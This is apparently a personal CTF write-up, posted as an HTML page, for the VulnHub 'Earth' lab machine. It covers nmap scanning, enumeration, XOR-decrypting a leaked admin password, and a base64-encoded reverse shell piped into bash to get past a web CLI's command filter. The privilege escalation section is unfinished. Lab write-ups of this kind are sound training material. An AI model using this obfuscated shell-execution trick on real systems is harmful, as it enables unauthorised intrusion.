@@ -1,0 +1,162 @@
+<!DOCTYPE HTML>
+<!--
+	Dimension by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>Blacree - Earth</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="../../assets/css/main.css" />
+		<noscript><link rel="stylesheet" href="../../assets/css/noscript.css" /></noscript>
+        <style type="text/css">
+            #middle{
+			font-family: Liberation Mono;
+			font-size: 0.9rem;
+			text-align: left;
+            padding: 4.5rem 2.5rem 1.5rem 2.5rem ;
+			position: relative;
+			width: 50rem;
+			max-width: 100%;
+			background-color: rgba(27, 31, 34, 0.85);
+			border-radius: 4px;
+            }
+			.img{display: block;
+  				margin-left: auto;
+  				margin-right: auto;
+  				width: 100%;
+				margin-top: 2.5%;
+				margin-bottom: 2.5%;
+			}
+			.displayimage{
+				margin-top: 2.5%;
+				margin-bottom: 2.5%;
+				display: block;
+				max-width: 100%;
+			}
+			code{
+				margin-top: 2.5%;
+				margin-bottom: 2.5%;
+			}
+			hr{
+                margin-top: 2.5%;
+                margin-bottom: 6.0%;
+				border-color: gray;
+            }
+        </style>
+	</head>
+	<body class="is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+                <header id="header">
+				<!-- Main -->
+					<!-- <div class="content"> -->
+                        <div id="middle">
+                        <article style="text-align: justify;">
+                            <a href="../../index.html"><h2 style="text-align: right; color: gray;">Home</h2></a>
+                            <p>
+							<h2 class="major">VULNHUB - EARTH</h2>
+							<img src="img/earth/earth_banner.png" class="img"/>
+							More to come...<br><br>
+							<hr>
+							</p>
+							<p>
+								<h3 style="text-align: left;">Scanning and Enumeration</h3>
+								Starting with an NMAP scan we have...
+								<pre><code>$ nmap -p- -sC -sV --min-rate=1000 -T4 10.0.2.5
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 03:00 EDT
+Nmap scan report for 10.0.2.5
+Host is up (0.00052s latency).
+Not shown: 65404 filtered tcp ports (no-response), 128 filtered tcp ports (host-unreach)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
+| ssh-hostkey: 
+|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
+|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
+|_http-title: Bad Request (400)
+|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Test Page for the HTTP Server on Fedora
+| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
+| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
+| Not valid before: 2021-10-12T23:26:31
+|_Not valid after:  2031-10-10T23:26:31
+|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 150.55 seconds</code></pre>
+								We have an ssh and a web server.<br><br>
+								<h4 style="text-align: left;">Web Server - TCP 80 | TCP 443 (SSL)</h4>
+								Both web servers respond with a <code>400</code> (Bad Request) status code to every request. No directories or subdomain found either.
+								However in our nmap scan, under the web server that uses https, we have found a domain <code>earth.local</code>, and a sub-domain <code>terratest.earth.local</code>.
+								Both return the home page below...
+								<img src="img/earth/home_page.png" class="displayimage">
+								The home page has a functionality that allows both the domain (https://earth.local) and the sub-domain (https://terratest.earth.local) to communicate with eachother 
+								by sending a message encrypted with a key as shown below...
+								<img src="img/earth/send_message_home_page.png" class="displayimage">
+								After performing directory enumeration, on <code>https://earth.local</code> we have...
+								<img src="img/earth/earth_directory_enumeration.png" class="displayimage">
+								This gives us an admin login page...
+								<img src="img/earth/admin_login_page.png" class="displayimage">
+								In the <code>robots.txt</code> file of <code>https://terratest.earth.local</code> we have...
+								<img src="img/earth/robots_file_info.png" class="displayimage">
+								In <code>testingnotes.txt</code> we have the following information...
+								<img src="img/earth/testingnotes_content.png" class="displayimage">
+								From the data, we have the following information:
+								<ul type="circle">
+									<li>The encryption used is <code>XOR</code>.</li>
+									<li><code>testdata.txt</code> contains the message key used for the encrypted messages on the home page.</li>
+									<li><code>terra</code> is the admin username.</li>
+								</ul>
+								The contents <code>testdata.txt</code> include...
+								<img src="img/earth/testdata_contents.png" class="displayimage">
+								Let's use it to decrypt the encrypted messages found on the home page. Using <code>https://</code> we have...
+								<!-- <img> -->
+								We have  <code>earthclimatechangebad4humans</code> which is the password for admin user <code>terra</code>. After logging in we have a cli interface...
+								<img src="img/earth/terratest_admin_cli.png" class="displayimage">
+								Let's exploit it to get a reverse shell. Using the netcast, python or bash commands we get no reverse connection. But if we use base64 encoding we get a connection.
+								First encode the reverse shell command using base64: 
+								<br>
+								<code>echo '&lt;command&gt;' | base64</code>
+								<br>
+								Then take the encoded output and run the following command in the cli:
+								<br>
+								<code>echo &lt;encoded_output&gt; | base64 -d | bash</code>
+								<br>
+								This takes our encoded ouput, decodes it using base64 binary and runs the output using bash. On our listener we get a connection and can view the user flag.
+								<img src="img/earth/first_shell_apache_user.png" class="displayimage">
+								<h4 style="text-align: left;">Privilege Escalation</h3>
+							</p>
+							<p style="text-align: center;">Thank you for reading my writeup 😀 <a href="../../index.html" style="color: #FFA500;">| Home</a></p>
+                        </article>
+                        </div>
+                </header>
+					<!-- </div> -->
+
+				<!-- Footer -->
+					<footer id="footer">
+						<!--<p class="copyright">&copy; Untitled. Design: <a href="https://html5up.net">HTML5 UP</a>.</p> -->
+					</footer>
+			</div>
+
+		<!-- BG -->
+			<div id="bg"></div>
+
+		<!-- Scripts -->
+			<script src="../../assets/js/jquery.min.js"></script>
+			<script src="../../assets/js/browser.min.js"></script>
+			<script src="../../assets/js/breakpoints.min.js"></script>
+			<script src="../../assets/js/util.js"></script>
+			<script src="../../assets/js/main.js"></script>
+
+	</body>
+</html>
